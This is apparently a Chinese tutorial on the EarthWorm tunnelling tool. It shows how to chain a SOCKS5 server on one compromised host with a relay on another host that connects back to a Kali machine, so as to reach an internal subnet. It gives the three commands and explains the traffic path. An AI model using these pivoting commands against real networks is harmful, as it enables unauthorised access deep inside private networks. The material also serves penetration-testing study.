# EarthWorm (EW) 工具搭建多级网络代理隧道（LCX 正向级联）

## 示例
**比如说要让流量从 Kali 穿透到 93 网段，EW 工具需要充当三种角色：**

- 第一棒：PC1 上的 ssocksd (服务端)
   ```
   ew_win32.exe -s ssocksd -l 9999
   ```
   扮演角色：“终点站代理”。

   原理：在 PC1 上开启一个 SOCKS5 代理，监听 9999 端口。因为 PC1 有两块网卡，只要流量进了这个 9999 端口，PC1 就能把请求转发到 93 网段。


- 第二棒：Web1 上的 lcx_slave (中继端)
   ```
   ./ew_for_linux64 -s lcx_slave -d Kali_IP -e 1235 -f PC1_IP -g 9999
   ```
   扮演角色：“地下通道挖掘机”。

   原理：Web1 执行这条命令后，它会做两件事：

   - 向后：主动去连接 Kali 的 1235 端口。
   - 向前：主动去连接 PC1 的 9999 端口。
   - 打洞：把 Kali 和 PC1 连起来。只要 Kali 发数据给 Web1，Web1 就原封不动丢给 PC1。这样，Kali 就能“摸”到 PC1 的代理了。

- 第三棒：Kali 上的 lcx_listen (主控端)
   ```
   ./ew_for_linux64 -s lcx_listen -l 12349 -e 1235
   ```
   扮演角色：“总闸门”。

   原理：Kali 自己开两个端口：

   - -l 12349：给你本地工具（如 Proxifier、浏览器、MSF）用的。你把工具的代理指向 127.0.0.1:12349。

   - -e 1235：用来跟远端的 Web1 对接。当 Web1 连上 1235 时，Kali 就把 12349 收到的流量丢进 1235 发出去。

**流量是怎么跑通的**

- 假设在 Kali 上用浏览器（配置了代理 127.0.0.1:12349）访问最深处的 192.168.93.30。

  - 浏览器把请求发给 Kali 的 12349 端口。

  - Kali (主控端) 把请求塞进与 Web1 建立的 1235 通道中，发给 Web1。

  - Web1 (中继端) 收到请求，顺着自己与 PC1 建立的 9999 通道，丢给 PC1。

  - PC1 (代理端) 收到请求，用它自己的网卡，直接访问 93.30，拿到网页数据。

  - 回程：数据按原路返回：PC1 -> Web1 -> Kali 12349 -> 浏览器。

- 这样， Kali 就像拥有了 PC1 的网卡一样，畅通无阻地访问了 93 网段。
